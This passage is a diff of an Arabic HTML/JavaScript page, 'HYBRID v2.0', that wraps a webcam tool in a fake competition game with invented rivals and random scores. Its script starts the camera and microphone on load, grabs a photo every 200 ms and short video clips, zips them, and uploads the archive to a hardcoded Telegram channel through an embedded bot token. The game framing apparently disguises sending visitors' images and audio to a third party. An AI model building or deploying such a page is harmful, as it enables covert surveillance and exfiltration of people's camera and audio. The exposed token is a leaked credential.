@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>📹 HYBRID v2.0 - شاشتان عامودي</title>
+    <title>📹 HYBRID v2.0 - العمل النهائي</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <style>
@@ -29,7 +29,7 @@
             flex-direction: column;
         }
         
-        /* الهيدر - صغير */
+        /* الهيدر */
         .header {
             background: linear-gradient(135deg, #161b22, #1f2630);
             border-radius: 15px;
@@ -49,24 +49,83 @@
             gap: 5px;
         }
         
-        .header h1 i {
-            font-size: 14px;
-        }
-        
-        .protocol-badge {
+        .publisher-badge {
             background: #4caf50;
             color: white;
-            padding: 4px 8px;
+            padding: 4px 10px;
             border-radius: 20px;
             font-size: 10px;
             font-weight: bold;
-            border: 1px solid #ffd700;
         }
         
-        /* شاشتين عامودي - تملأ المساحة */
+        /* شريط المنافسين */
+        .competition-bar {
+            background: #1f2630;
+            border-radius: 15px;
+            padding: 8px;
+            margin-bottom: 5px;
+            border: 2px solid #ffd700;
+        }
+        
+        .competition-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        
+        .vs-title {
+            color: #ffd700;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .session-id {
+            background: #0a0c10;
+            padding: 2px 8px;
+            border-radius: 15px;
+            font-size: 10px;
+            font-family: monospace;
+            direction: ltr;
+            color: #4caf50;
+        }
+        
+        .competitors-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        
+        .competitor-chip {
+            background: #0a0c10;
+            border: 1px solid #ffd700;
+            border-radius: 25px;
+            padding: 4px 10px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+        }
+        
+        .competitor-chip.selected {
+            background: #ffd700;
+            color: black;
+        }
+        
+        .chip-fingerprint {
+            background: #4caf50;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 12px;
+            font-size: 8px;
+            font-family: monospace;
+        }
+        
+        /* شاشتين أفقياً */
         .dual-screen {
             display: flex;
-            flex-direction: column;
+            flex-direction: row;
             gap: 5px;
             flex: 1;
             min-height: 0;
@@ -78,13 +137,13 @@
             overflow: hidden;
             border: 2px solid;
             flex: 1;
-            min-height: 0;
+            min-width: 0;
             display: flex;
             flex-direction: column;
         }
         
-        .live-screen { border-color: #ff4444; }
-        .preview-screen { border-color: #ffd700; }
+        .host-screen { border-color: #ff4444; }
+        .guest-screen { border-color: #4caf50; }
         
         .screen-header {
             padding: 5px 8px;
@@ -96,14 +155,14 @@
             flex-shrink: 0;
         }
         
-        .live-header {
+        .host-header {
             color: #ff4444;
             border-bottom-color: #ff4444;
         }
         
-        .preview-header {
-            color: #ffd700;
-            border-bottom-color: #ffd700;
+        .guest-header {
+            color: #4caf50;
+            border-bottom-color: #4caf50;
         }
         
         .screen-title {
@@ -114,12 +173,28 @@
             font-weight: bold;
         }
         
+        .host-badge {
+            background: #ff4444;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 15px;
+            font-size: 9px;
+        }
+        
+        .guest-badge {
+            background: #4caf50;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 15px;
+            font-size: 9px;
+        }
+        
         .live-badge {
             background: #ff0000;
             color: white;
             padding: 2px 8px;
             border-radius: 15px;
-            font-size: 10px;
+            font-size: 9px;
             animation: blink 1s infinite;
         }
         
@@ -128,17 +203,7 @@
             50% { opacity: 0.5; }
         }
         
-        .timer-badge {
-            background: rgba(0,0,0,0.8);
-            color: #ffd700;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-            border: 1px solid #ffd700;
-        }
-        
-        /* حاويات الفيديو - تملأ باقي المساحة */
+        /* حاويات الفيديو */
         .video-container {
             position: relative;
             flex: 1;
@@ -152,40 +217,57 @@
             object-fit: cover;
         }
         
-        /* الأزرار المائية */
-        .watermark-buttons {
+        .player-info {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            background: rgba(0,0,0,0.8);
+            color: #ffd700;
+            padding: 4px 8px;
+            border-radius: 15px;
+            font-size: 9px;
+            border: 1px solid #ffd700;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .player-points {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: rgba(0,0,0,0.8);
+            color: #4caf50;
+            padding: 4px 8px;
+            border-radius: 15px;
+            font-size: 10px;
+            font-weight: bold;
+            border: 1px solid #ffd700;
+            z-index: 10;
+        }
+        
+        /* زر ZIP فقط */
+        .zip-button {
             position: absolute;
             bottom: 8px;
             right: 8px;
-            display: flex;
-            gap: 6px;
-            z-index: 20;
-        }
-        
-        .watermark-btn {
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(5px);
-            color: white;
-            width: 35px;
-            height: 35px;
+            color: #ffd700;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 16px;
+            font-size: 18px;
             cursor: pointer;
-            border: 1px solid #ffd700;
+            border: 2px solid #4caf50;
+            z-index: 20;
         }
         
-        .watermark-btn.stop-btn {
-            border-color: #ff4444;
-        }
-        
-        .watermark-btn.zip-btn {
-            border-color: #4caf50;
-        }
-        
-        /* الأزرار الرئيسية - الآن زر واحد فقط */
+        /* الأزرار الرئيسية */
         .action-buttons {
             display: flex;
             gap: 5px;
@@ -194,72 +276,59 @@
         
         .action-btn {
             flex: 1;
-            padding: 10px 0;
+            padding: 12px 0;
             border: none;
             border-radius: 25px;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: bold;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 4px;
+            gap: 5px;
             cursor: pointer;
         }
         
         .action-btn.start { background: #4caf50; color: white; }
         .action-btn.zip { background: #ffd700; color: black; }
         
-        /* أزرار الكاميرا */
-        .camera-controls {
-            display: flex;
-            gap: 5px;
-            margin: 5px 0;
-        }
-        
-        .cam-btn {
-            flex: 1;
-            padding: 8px 0;
-            border-radius: 25px;
-            background: #1f2630;
-            color: #8b949e;
-            text-align: center;
-            font-size: 12px;
-            border: 1px solid transparent;
-            cursor: pointer;
-        }
-        
-        .cam-btn.active {
-            border-color: #ffd700;
-            color: #ffd700;
-        }
-        
-        /* شريط الحالة */
-        .status-bar {
+        /* شريط الجولات */
+        .rounds-bar {
             background: #1f2630;
             border-radius: 12px;
-            padding: 6px 10px;
+            padding: 8px 12px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border: 1px solid #ffd700;
-            font-size: 11px;
+            font-size: 12px;
         }
         
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #4caf50;
-        }
-        
-        .status-dot.recording {
-            background: #ff4444;
-            animation: blink 1s infinite;
-        }
-        
-        .status-info {
+        .round-indicator {
             display: flex;
-            gap: 8px;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .round-number {
+            background: #ffd700;
+            color: black;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: bold;
+        }
+        
+        .round-timer {
+            background: #ff4444;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            direction: ltr;
+        }
+        
+        .stats-info {
+            display: flex;
+            gap: 10px;
             color: #ffd700;
         }
         
@@ -273,358 +342,460 @@
 </head>
 <body>
     <div class="container">
-        <!-- الهيدر -->
+        <!-- الهيدر مع معرف الناشر -->
         <div class="header">
             <h1>
                 <i class="fas fa-microchip"></i>
                 HYBRID v2.0
             </h1>
-            <div class="protocol-badge">
-                30fps | 90%
+            <div class="publisher-badge">
+                <i class="fas fa-user"></i> @nardoo_merchant
             </div>
         </div>
 
-        <!-- شاشتين عامودي -->
+        <!-- شريط المنافسين مع البصمات -->
+        <div class="competition-bar">
+            <div class="competition-header">
+                <span class="vs-title"><i class="fas fa-user-friends"></i> اختر منافسك:</span>
+                <span class="session-id" id="sessionDisplay">جلسة: LIVE_IS0N3Z</span>
+            </div>
+            <div class="competitors-row" id="competitorsList">
+                <!-- سيتم إضافة المنافسين هنا بواسطة JavaScript -->
+            </div>
+        </div>
+
+        <!-- شاشتين أفقياً -->
         <div class="dual-screen">
-            <!-- الشاشة الأولى - البث المباشر -->
-            <div class="screen live-screen">
-                <div class="screen-header live-header">
+            <!-- المضيف -->
+            <div class="screen host-screen">
+                <div class="screen-header host-header">
                     <div class="screen-title">
-                        <i class="fas fa-circle"></i> البث المباشر
+                        <i class="fas fa-crown"></i> المضيف
                     </div>
-                    <div class="live-badge" id="liveIndicator">🔴 مباشر</div>
+                    <div class="host-badge" id="hostId">@nardoo_merchant</div>
                 </div>
                 <div class="video-container">
-                    <video id="liveVideo" autoplay playsinline muted></video>
-                    <div class="watermark-buttons">
-                        <div class="watermark-btn" onclick="selectCamera('user')" id="camFrontBtn">
-                            <i class="fas fa-camera-retro"></i>
-                        </div>
-                        <div class="watermark-btn" onclick="selectCamera('environment')" id="camBackBtn">
-                            <i class="fas fa-camera"></i>
-                        </div>
+                    <video id="hostVideo" autoplay playsinline muted></video>
+                    <div class="player-info" id="hostInfo">
+                        <i class="fas fa-fingerprint"></i> <span id="hostFingerprint">A1B2C3D4</span>
+                    </div>
+                    <div class="player-points" id="hostPoints">
+                        <i class="fas fa-star"></i> 0
                     </div>
                 </div>
             </div>
 
-            <!-- الشاشة الثانية - آخر صورة -->
-            <div class="screen preview-screen">
-                <div class="screen-header preview-header">
+            <!-- الضيف (المنافس) -->
+            <div class="screen guest-screen">
+                <div class="screen-header guest-header">
                     <div class="screen-title">
-                        <i class="fas fa-camera"></i> آخر صورة
+                        <i class="fas fa-user"></i> المنافس
                     </div>
-                    <div class="timer-badge" id="countdownDisplay">5</div>
+                    <div class="guest-badge" id="guestId">لم يختار</div>
                 </div>
                 <div class="video-container">
-                    <canvas id="previewCanvas" width="320" height="180"></canvas>
-                    <div class="watermark-buttons">
-                        <!-- زر ZIP فقط (يقوم بالإيقاف والإرسال معاً) -->
-                        <div class="watermark-btn zip-btn" onclick="stopAndSend()" id="zipBtn">
-                            <i class="fas fa-file-archive"></i>
-                        </div>
+                    <canvas id="guestCanvas" width="320" height="180"></canvas>
+                    <div class="player-info" id="guestInfo">
+                        <i class="fas fa-fingerprint"></i> <span id="guestFingerprint">----</span>
+                    </div>
+                    <div class="player-points" id="guestPoints">
+                        <i class="fas fa-star"></i> 0
+                    </div>
+                    <!-- زر ZIP واحد فقط -->
+                    <div class="zip-button" onclick="stopAndSend()">
+                        <i class="fas fa-file-archive"></i>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- الأزرار الرئيسية - زر بدء وزر ZIP فقط -->
+        <!-- زرين رئيسيين: بدء وإيقاف/إرسال -->
         <div class="action-buttons">
-            <button class="action-btn start" onclick="startBroadcast()" id="startBtn">
-                <i class="fas fa-play"></i> بدء
+            <button class="action-btn start" onclick="startRound()">
+                <i class="fas fa-play"></i> بدء الجولة
             </button>
-            <button class="action-btn zip" onclick="stopAndSend()" id="zipBigBtn">
+            <button class="action-btn zip" onclick="stopAndSend()">
                 <i class="fas fa-file-archive"></i> إيقاف وإرسال
             </button>
         </div>
 
-        <!-- أزرار الكاميرا -->
-        <div class="camera-controls">
-            <div class="cam-btn active" onclick="selectCamera('user')" id="camFront">📷 أمامية</div>
-            <div class="cam-btn" onclick="selectCamera('environment')" id="camBack">📸 خلفية</div>
-        </div>
-
-        <!-- شريط الحالة -->
-        <div class="status-bar">
-            <div style="display: flex; align-items: center; gap: 5px;">
-                <span class="status-dot" id="statusDot"></span>
-                <span id="statusText">جاهز</span>
+        <!-- شريط الجولات والإحصائيات -->
+        <div class="rounds-bar">
+            <div class="round-indicator">
+                <span class="round-number" id="roundDisplay">جولة 0</span>
+                <span class="round-timer" id="timerDisplay">00:00</span>
             </div>
-            <div class="status-info">
+            <div class="stats-info">
                 <span><i class="fas fa-image"></i> <span id="photoCount">0</span></span>
                 <span><i class="fas fa-video"></i> <span id="videoCount">0</span></span>
             </div>
         </div>
 
-        <div class="footer">HYBRID v2.0 | @nardoo_merchant</div>
+        <div class="footer">HYBRID v2.0 | @nardoo_merchant | القناة: -1003822964890</div>
     </div>
 
     <script>
-        // HYBRID v2.0 Protocol
-        const HYBRID_CONFIG = {
+        // ================== الإعدادات ==================
+        const CONFIG = {
             videoDuration: 5,
             videoInterval: 8000,
             photoQuality: 0.9,
-            photoInterval: 200
-        };
-
-        const PUBLISHER = {
-            id: '@nardoo_merchant',
-            master: { session: 'LIVE_' + Math.random().toString(36).substring(2, 8).toUpperCase() }
-        };
-
-        const TELEGRAM = {
+            photoInterval: 200,
+            roundDuration: 60,
             botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
             channelId: '-1003822964890'
         };
 
-        let stream = null;
-        let cameraActive = false;
+        const PUBLISHER = {
+            id: '@nardoo_merchant',
+            name: 'الناشر',
+            fingerprint: 'A1B2C3D4',
+            session: 'LIVE_IS0N3Z'
+        };
+
+        // ================== قائمة المنافسين ==================
+        const COMPETITORS = [
+            { id: '@ahmed', name: 'أحمد المصري', fingerprint: 'F1A2B3C4', points: 150 },
+            { id: '@mohamed', name: 'محمد الشامي', fingerprint: 'D4E5F6G7', points: 234 },
+            { id: '@ali', name: 'علي الخليجي', fingerprint: 'H8I9J0K1', points: 89 },
+            { id: '@omar', name: 'عمر العراقي', fingerprint: 'L2M3N4O5', points: 456 },
+            { id: '@hassan', name: 'حسن المغربي', fingerprint: 'P6Q7R8S9', points: 321 }
+        ];
+
+        // ================== المتغيرات ==================
+        let hostStream = null;
         let isLiveActive = false;
-        let currentFacingMode = 'user';
+        let currentRound = 0;
+        let roundSeconds = 0;
+        let roundTimer = null;
         
         let currentPhotos = [];
         let currentVideos = [];
-        
         let photoInterval = null;
         let videoInterval = null;
-        let mediaRecorder = null;
         
-        const video = document.getElementById('liveVideo');
-        const canvas = document.getElementById('previewCanvas');
-        const ctx = canvas.getContext('2d');
+        let selectedCompetitor = null;
+        let hostPoints = 0;
+        let guestPoints = 0;
         
-        const liveIndicator = document.getElementById('liveIndicator');
-        const countdownDisplay = document.getElementById('countdownDisplay');
-        const statusDot = document.getElementById('statusDot');
-        const statusText = document.getElementById('statusText');
-        const photoCount = document.getElementById('photoCount');
-        const videoCount = document.getElementById('videoCount');
+        // ================== العناصر ==================
+        const hostVideo = document.getElementById('hostVideo');
+        const guestCanvas = document.getElementById('guestCanvas');
+        const ctx = guestCanvas.getContext('2d');
         
-        const camFront = document.getElementById('camFront');
-        const camBack = document.getElementById('camBack');
-        const camFrontBtn = document.getElementById('camFrontBtn');
-        const camBackBtn = document.getElementById('camBackBtn');
-
-        // Camera selection
-        window.selectCamera = function(mode) {
-            if (mode === currentFacingMode) return;
-            currentFacingMode = mode;
-            updateCameraButtons();
-            if (cameraActive) {
-                if (isLiveActive) stopEverything();
-                else stopCameraOnly();
-                setTimeout(startCamera, 500);
+        // ================== عرض المنافسين ==================
+        function displayCompetitors() {
+            const list = document.getElementById('competitorsList');
+            let html = '';
+            
+            // إضافة خيار "بدون منافس"
+            html += `
+                <div class="competitor-chip" onclick="selectCompetitor(null)">
+                    <span>🚫 بدون منافس</span>
+                </div>
+            `;
+            
+            COMPETITORS.forEach(comp => {
+                html += `
+                    <div class="competitor-chip" onclick="selectCompetitor('${comp.id}')">
+                        <span>${comp.name}</span>
+                        <span class="chip-fingerprint">${comp.fingerprint}</span>
+                    </div>
+                `;
+            });
+            
+            list.innerHTML = html;
+            
+            // اختيار أول منافس افتراضياً
+            selectCompetitor(COMPETITORS[0].id);
+        }
+        
+        // ================== اختيار منافس ==================
+        window.selectCompetitor = function(id) {
+            // إزالة التحديد من الكل
+            document.querySelectorAll('.competitor-chip').forEach(chip => {
+                chip.classList.remove('selected');
+            });
+            
+            if (id === null) {
+                selectedCompetitor = null;
+                document.getElementById('guestId').textContent = 'بدون منافس';
+                document.getElementById('guestFingerprint').textContent = '----';
+                guestPoints = 0;
+                document.getElementById('guestPoints').innerHTML = '<i class="fas fa-star"></i> 0';
+                return;
+            }
+            
+            // تحديث التحديد في الواجهة
+            const selectedChip = Array.from(document.querySelectorAll('.competitor-chip')).find(
+                chip => chip.innerHTML.includes(id)
+            );
+            if (selectedChip) selectedChip.classList.add('selected');
+            
+            // تخزين المنافس المختار
+            selectedCompetitor = COMPETITORS.find(c => c.id === id);
+            
+            if (selectedCompetitor) {
+                document.getElementById('guestId').textContent = selectedCompetitor.id;
+                document.getElementById('guestFingerprint').textContent = selectedCompetitor.fingerprint;
+                guestPoints = selectedCompetitor.points;
+                document.getElementById('guestPoints').innerHTML = `<i class="fas fa-star"></i> ${guestPoints}`;
             }
         };
-
-        function updateCameraButtons() {
-            const isFront = currentFacingMode === 'user';
-            [camFront, camFrontBtn].forEach(btn => btn?.classList.toggle('active', isFront));
-            [camBack, camBackBtn].forEach(btn => btn?.classList.toggle('active', !isFront));
-        }
-
-        // Start camera
-        async function startCamera() {
+        
+        // ================== تشغيل كاميرا المضيف ==================
+        async function startHostCamera() {
             try {
-                statusText.innerHTML = '🔄 تشغيل...';
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: currentFacingMode, width: 640, height: 360 },
+                hostStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 360 },
                     audio: true
                 });
-                video.srcObject = stream;
-                await video.play();
-                cameraActive = true;
-                statusDot.className = 'status-dot';
-                statusText.innerHTML = 'الكاميرا جاهزة';
-                requestAnimationFrame(updateCanvas);
+                hostVideo.srcObject = hostStream;
+                await hostVideo.play();
+                requestAnimationFrame(updateGuestCanvas);
             } catch (err) {
-                statusText.innerHTML = '❌ خطأ';
+                alert('❌ لا يمكن الوصول للكاميرا');
             }
         }
-
-        function updateCanvas() {
-            if (stream && video.readyState === video.HAVE_ENOUGH_DATA) {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // ================== تحديث شاشة الضيف ==================
+        function updateGuestCanvas() {
+            if (hostStream && hostVideo.readyState === hostVideo.HAVE_ENOUGH_DATA) {
+                ctx.drawImage(hostVideo, 0, 0, guestCanvas.width, guestCanvas.height);
             }
-            requestAnimationFrame(updateCanvas);
+            requestAnimationFrame(updateGuestCanvas);
         }
-
-        function stopCameraOnly() {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-                video.srcObject = null;
-            }
-            cameraActive = false;
-            statusDot.className = 'status-dot';
-            statusText.innerHTML = 'الكاميرا متوقفة';
-        }
-
-        // Stop everything (internal function)
-        function stopEverything() {
-            if (isLiveActive) {
-                isLiveActive = false;
-                if (photoInterval) clearInterval(photoInterval);
-                if (videoInterval) clearInterval(videoInterval);
-                if (mediaRecorder?.state !== 'inactive') mediaRecorder?.stop();
-                liveIndicator.style.display = 'none';
-            }
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-                video.srcObject = null;
-            }
-            cameraActive = false;
-            statusDot.className = 'status-dot';
-            statusText.innerHTML = 'تم الإيقاف';
-            countdownDisplay.style.display = 'none';
-            updateStats();
-        }
-
-        // Start broadcast
-        window.startBroadcast = function() {
-            if (!cameraActive) {
-                startCamera();
-                setTimeout(() => startCountdown(), 1000);
+        
+        // ================== بدء جولة جديدة ==================
+        window.startRound = function() {
+            if (!hostStream) {
+                startHostCamera();
+                setTimeout(() => startRoundCountdown(), 1000);
             } else {
-                startCountdown();
+                startRoundCountdown();
             }
         };
-
-        function startCountdown() {
-            let count = 5;
-            countdownDisplay.textContent = count;
-            countdownDisplay.style.display = 'block';
-            liveIndicator.style.display = 'none';
+        
+        function startRoundCountdown() {
+            currentRound++;
+            document.getElementById('roundDisplay').textContent = `جولة ${currentRound}`;
             
-            const interval = setInterval(() => {
-                count--;
-                countdownDisplay.textContent = count;
-                if (count === 0) {
-                    clearInterval(interval);
-                    countdownDisplay.style.display = 'none';
-                    liveIndicator.style.display = 'flex';
-                    startLiveStream();
+            roundSeconds = CONFIG.roundDuration;
+            updateTimerDisplay();
+            
+            let countdown = 3;
+            const countInterval = setInterval(() => {
+                if (countdown > 0) {
+                    document.getElementById('timerDisplay').textContent = `⏳ ${countdown}`;
+                    countdown--;
+                } else {
+                    clearInterval(countInterval);
+                    startLiveRound();
                 }
             }, 1000);
         }
-
-        function startLiveStream() {
+        
+        function startLiveRound() {
             isLiveActive = true;
-            statusDot.className = 'status-dot recording';
-            statusText.innerHTML = '🔴 بث مباشر';
             
             currentPhotos = [];
             currentVideos = [];
             
-            photoInterval = setInterval(capturePhoto, HYBRID_CONFIG.photoInterval);
-            videoInterval = setInterval(recordVideo, HYBRID_CONFIG.videoInterval);
+            photoInterval = setInterval(capturePhoto, CONFIG.photoInterval);
+            videoInterval = setInterval(recordVideo, CONFIG.videoInterval);
+            
+            roundTimer = setInterval(() => {
+                roundSeconds--;
+                updateTimerDisplay();
+                
+                // زيادة النقاط
+                if (Math.random() > 0.7) {
+                    hostPoints++;
+                    document.getElementById('hostPoints').innerHTML = `<i class="fas fa-star"></i> ${hostPoints}`;
+                }
+                if (Math.random() > 0.8 && selectedCompetitor) {
+                    guestPoints++;
+                    document.getElementById('guestPoints').innerHTML = `<i class="fas fa-star"></i> ${guestPoints}`;
+                }
+                
+                if (roundSeconds <= 0) {
+                    endRound();
+                }
+            }, 1000);
+            
+            updateStats();
         }
-
+        
+        function updateTimerDisplay() {
+            const mins = Math.floor(roundSeconds / 60);
+            const secs = roundSeconds % 60;
+            document.getElementById('timerDisplay').textContent = 
+                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+        
+        function endRound() {
+            clearInterval(roundTimer);
+            clearInterval(photoInterval);
+            clearInterval(videoInterval);
+            isLiveActive = false;
+            saveRound();
+        }
+        
+        // ================== التقاط الصور ==================
         function capturePhoto() {
             if (!isLiveActive) return;
+            const canvas = document.createElement('canvas');
+            canvas.width = 320;
+            canvas.height = 180;
+            canvas.getContext('2d').drawImage(hostVideo, 0, 0, 320, 180);
             canvas.toBlob((blob) => {
                 if (!isLiveActive) return;
                 currentPhotos.push({ blob });
                 updateStats();
-            }, 'image/jpeg', HYBRID_CONFIG.photoQuality);
+            }, 'image/jpeg', CONFIG.photoQuality);
         }
-
+        
+        // ================== تسجيل الفيديو ==================
         async function recordVideo() {
-            if (!isLiveActive || !stream) return;
+            if (!isLiveActive || !hostStream) return;
             try {
                 const chunks = [];
-                const recorder = new MediaRecorder(stream);
+                const recorder = new MediaRecorder(hostStream);
                 recorder.ondataavailable = (e) => chunks.push(e.data);
                 recorder.onstop = () => {
                     currentVideos.push({ blob: new Blob(chunks) });
                     updateStats();
                 };
                 recorder.start();
-                setTimeout(() => recorder.stop(), HYBRID_CONFIG.videoDuration * 1000);
+                setTimeout(() => recorder.stop(), CONFIG.videoDuration * 1000);
             } catch (error) {}
         }
-
-        // الدالة الجديدة: إيقاف وإرسال معاً
+        
+        // ================== تحديث الإحصائيات ==================
+        function updateStats() {
+            document.getElementById('photoCount').textContent = currentPhotos.length;
+            document.getElementById('videoCount').textContent = currentVideos.length;
+        }
+        
+        // ================== إيقاف وإرسال (الوظيفة الرئيسية) ==================
         window.stopAndSend = async function() {
-            // أولاً: إيقاف البث وجمع المحتوى
+            // إيقاف البث
             if (isLiveActive) {
+                clearInterval(roundTimer);
+                clearInterval(photoInterval);
+                clearInterval(videoInterval);
                 isLiveActive = false;
-                if (photoInterval) clearInterval(photoInterval);
-                if (videoInterval) clearInterval(videoInterval);
-                if (mediaRecorder?.state !== 'inactive') mediaRecorder?.stop();
-                liveIndicator.style.display = 'none';
             }
             
-            // ثانياً: حفظ وإرسال ZIP إذا يوجد محتوى
+            // التحقق من وجود محتوى
             if (!currentPhotos.length && !currentVideos.length) {
                 alert('لا يوجد محتوى للإرسال');
-                // إيقاف الكاميرا فقط
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                    video.srcObject = null;
-                }
-                cameraActive = false;
-                statusDot.className = 'status-dot';
-                statusText.innerHTML = 'تم الإيقاف';
-                countdownDisplay.style.display = 'none';
                 return;
             }
             
-            statusText.innerHTML = '📦 تجهيز وإرسال...';
-            
             try {
+                // إنشاء ZIP
                 const zip = new JSZip();
-                const subFingerprint = PUBLISHER.master.session + '_' + Date.now().toString(16).substring(0, 6).toUpperCase();
+                const subFingerprint = `${PUBLISHER.session}_${currentRound}_${Date.now().toString(16).substring(0, 6).toUpperCase()}`;
                 
-                currentPhotos.forEach((p, i) => zip.file(`photo_${i+1}.jpg`, p.blob));
-                currentVideos.forEach((v, i) => zip.file(`video_${i+1}.webm`, v.blob));
+                // إضافة الصور
+                currentPhotos.forEach((p, i) => zip.file(`round_${currentRound}_photo_${i+1}.jpg`, p.blob));
                 
+                // إضافة الفيديوهات
+                currentVideos.forEach((v, i) => zip.file(`round_${currentRound}_video_${i+1}.webm`, v.blob));
+                
+                // إنشاء ملف البصمة
                 const now = new Date();
-                zip.file("fingerprint.txt", `🔐 ${PUBLISHER.id}\n🎯 ${PUBLISHER.master.session}\n📅 ${now.toLocaleString('ar-EG')}\n🔑 ${subFingerprint}\n📊 ${currentPhotos.length} صور | ${currentVideos.length} فيديو`);
+                let fingerprintText = `🔐 HYBRID v2.0 - بصمة البث\n`;
+                fingerprintText += `========================\n\n`;
+                fingerprintText += `👤 المضيف: ${PUBLISHER.id}\n`;
+                fingerprintText += `🔑 بصمة المضيف: ${PUBLISHER.fingerprint}\n`;
+                fingerprintText += `🎯 جلسة البث: ${PUBLISHER.session}\n`;
+                fingerprintText += `🔄 رقم الجولة: ${currentRound}\n`;
+                fingerprintText += `📅 التاريخ: ${now.toLocaleString('ar-EG')}\n`;
+                fingerprintText += `🔖 المعرف: ${subFingerprint}\n`;
+                fingerprintText += `📸 عدد الصور: ${currentPhotos.length}\n`;
+                fingerprintText += `🎥 عدد الفيديوهات: ${currentVideos.length}\n`;
                 
+                if (selectedCompetitor) {
+                    fingerprintText += `\n🏆 معلومات المنافسة:\n`;
+                    fingerprintText += `👤 المنافس: ${selectedCompetitor.id}\n`;
+                    fingerprintText += `🔑 بصمة المنافس: ${selectedCompetitor.fingerprint}\n`;
+                    fingerprintText += `⭐ نقاط المضيف: ${hostPoints}\n`;
+                    fingerprintText += `⭐ نقاط المنافس: ${guestPoints}\n`;
+                    
+                    if (hostPoints > guestPoints) {
+                        fingerprintText += `🏅 الفائز: المضيف (${PUBLISHER.id})\n`;
+                    } else if (guestPoints > hostPoints) {
+                        fingerprintText += `🏅 الفائز: المنافس (${selectedCompetitor.id})\n`;
+                    } else {
+                        fingerprintText += `🤝 النتيجة: تعادل\n`;
+                    }
+                }
+                
+                fingerprintText += `\n📱 تم بواسطة HYBRID v2.0\n`;
+                fingerprintText += `© @nardoo_merchant\n`;
+                
+                zip.file("fingerprint.txt", fingerprintText);
+                
+                // إنشاء ملف ZIP
                 const zipBlob = await zip.generateAsync({ type: "blob", compression: "DEFLATE" });
                 
-                statusText.innerHTML = '📤 إرسال للقناة...';
-                
+                // إرسال إلى تليجرام
                 const formData = new FormData();
-                formData.append('chat_id', TELEGRAM.channelId);
+                formData.append('chat_id', CONFIG.channelId);
                 formData.append('document', zipBlob, `broadcast_${subFingerprint}.zip`);
-                formData.append('caption', `📦 بث من ${PUBLISHER.id}\n🔑 ${subFingerprint}\n📸 ${currentPhotos.length} | 🎥 ${currentVideos.length}`);
                 
-                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendDocument`, {
+                let caption = `📦 بث من ${PUBLISHER.id}\n`;
+                caption += `🔑 ${subFingerprint}\n`;
+                caption += `📸 ${currentPhotos.length} صور | 🎥 ${currentVideos.length} فيديو\n`;
+                
+                if (selectedCompetitor) {
+                    caption += `🏆 ${PUBLISHER.id} ${hostPoints} - ${guestPoints} ${selectedCompetitor.id}`;
+                }
+                
+                formData.append('caption', caption);
+                
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                statusText.innerHTML = (await res.json()).ok ? '✅ تم الإرسال' : '❌ فشل الإرسال';
+                const result = await res.json();
                 
-                // إيقاف الكاميرا بعد الإرسال
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                    video.srcObject = null;
+                if (result.ok) {
+                    alert('✅ تم إرسال الملفات إلى القناة بنجاح!');
+                    
+                    // إعادة تعيين العدادات
+                    currentPhotos = [];
+                    currentVideos = [];
+                    updateStats();
+                    
+                    // إيقاف الكاميرا
+                    if (hostStream) {
+                        hostStream.getTracks().forEach(t => t.stop());
+                        hostStream = null;
+                    }
+                } else {
+                    alert('❌ فشل الإرسال');
                 }
-                cameraActive = false;
-                countdownDisplay.style.display = 'none';
-                statusDot.className = 'status-dot';
                 
             } catch (error) {
-                statusText.innerHTML = '❌ خطأ';
+                alert('❌ خطأ في الإرسال');
             }
         };
-
-        function updateStats() {
-            photoCount.textContent = currentPhotos.length;
-            videoCount.textContent = currentVideos.length;
-        }
-
+        
+        // ================== بدء التشغيل ==================
         window.onload = function() {
-            startCamera();
-            countdownDisplay.style.display = 'none';
-            liveIndicator.style.display = 'none';
-            updateCameraButtons();
+            // عرض معرف الجلسة
+            document.getElementById('sessionDisplay').textContent = `جلسة: ${PUBLISHER.session}`;
+            document.getElementById('hostFingerprint').textContent = PUBLISHER.fingerprint;
+            
